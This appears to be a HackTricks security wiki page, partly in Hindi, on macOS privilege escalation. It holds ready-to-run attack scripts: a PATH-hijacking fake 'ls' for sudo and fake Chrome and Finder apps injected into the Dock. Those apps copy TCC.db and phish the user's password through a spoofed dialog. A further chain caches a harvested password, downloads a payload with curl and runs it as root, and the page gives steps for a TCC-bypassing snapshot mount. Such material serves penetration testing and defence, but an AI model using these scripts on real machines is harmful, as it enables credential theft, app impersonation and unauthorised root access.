# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

अगर आप यहाँ TCC privilege escalation की तलाश में हैं तो जाएँ:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

कृपया ध्यान दें कि **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** मशीनों पर भी असर करेंगे। इसलिए देखें:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## उपयोगकर्ता इंटरैक्शन

### Sudo Hijacking

आप मूल [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) पा सकते हैं।

हालाँकि, macOS **maintains** उपयोगकर्ता का **`PATH`** जब वह **`sudo`** चलाता है। इसका मतलब है कि इस हमले को पूरा करने का एक और तरीका यह होगा कि आप **hijack other binaries** जिन्हें पीड़ित **running sudo:** के दौरान चलाएगा।
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ध्यान दें कि टर्मिनल का उपयोग करने वाला उपयोगकर्ता बहुत संभवतः **Homebrew installed** रखता है। इसलिए **`/opt/homebrew/bin`** में बाइनरीज़ को hijack करना संभव है।

### Dock नक़ल

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Some suggestions:

- Dock में देखें कि क्या Chrome मौजूद है, और उस स्थिति में उस एंट्री को **हटा दें** और **जोड़ें** **नकली** **Chrome प्रविष्टि को उसी स्थिति में** Dock array में।
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
कुछ सुझाव:

- आप **Finder को Dock से हटा नहीं सकते**, इसलिए अगर आप इसे Dock में जोड़ने जा रहे हैं, तो आप नकली Finder को असली के ठीक बगल में रख सकते हैं। इसके लिए आपको **Dock array की शुरुआत में नकली Finder एंट्री जोड़ने** की आवश्यकता होगी।
- एक और विकल्प यह है कि इसे Dock में न रखें और बस खोल दें, "Finder asking to control Finder" इतना अजीब नहीं लगेगा।
- किसी घिनौने बॉक्स के साथ password मांगे बिना **escalate to root without asking** करने का एक और तरीका यह है कि Finder को वाकई किसी privileged action के लिए password माँगने पर मजबूर करें:
- Finder से अनुरोध करें कि वह **`/etc/pam.d`** में एक नया **`sudo`** फ़ाइल कॉपी करे (password माँगने वाला prompt यह संकेत करेगा कि "Finder wants to copy sudo")
- Finder से अनुरोध करें कि वह एक नया **Authorization Plugin** कॉपी करे (आप फ़ाइल का नाम नियंत्रित कर सकते हैं ताकि password माँगने वाला prompt यह बताए कि "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware अक्सर उपयोगकर्ता इंटरैक्शन का दुरुपयोग कर **sudo-सक्षम पासवर्ड** पकड़ता है और इसे प्रोग्रामेटिक रूप से पुन: उपयोग करता है। एक सामान्य प्रवाह:

1. लॉग इन उपयोगकर्ता की पहचान करने के लिए `whoami` का उपयोग करें।
2. **पासवर्ड प्रॉम्प्ट्स को लूप करें** जब तक `dscl . -authonly "$user" "$pw"` सफल न लौटाए।
3. क्रेडेंशियल को कैश करें (उदा., `/tmp/.pass`) और `sudo -S` (stdin के जरिए पासवर्ड) के साथ प्रिविलेज्ड कार्रवाई चलाएं।

उदाहरण: न्यूनतम चेन:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
चोरी किया गया पासवर्ड तब पुन: उपयोग किया जा सकता है ताकि **Gatekeeper क्वारैंटाइन को `xattr -c` के साथ साफ़ किया जा सके**, LaunchDaemons या अन्य विशेषाधिकार प्राप्त फ़ाइलों को कॉपी किया जा सके, और अतिरिक्त स्टेज गैर-इंटरैक्टिव रूप से चलाए जा सकें।

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**कोई भी उपयोगकर्ता** (यहाँ तक कि बिना विशेषाधिकार वाले उपयोगकर्ता भी) time machine snapshot बना सकता है और उस snapshot की **सभी फ़ाइलों तक पहुँच** प्राप्त कर सकता है.\
आवश्यक **केवल विशेषाधिकार** यह है कि उपयोग की जाने वाली एप्लिकेशन (जैसे `Terminal`) के पास **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) होना चाहिए जिसे एक admin द्वारा प्रदान किया जाना आवश्यक है।
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
एक अधिक विस्तृत व्याख्या [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## संवेदनशील जानकारी

यह escalate privileges करने में उपयोगी हो सकता है:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## संदर्भ

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
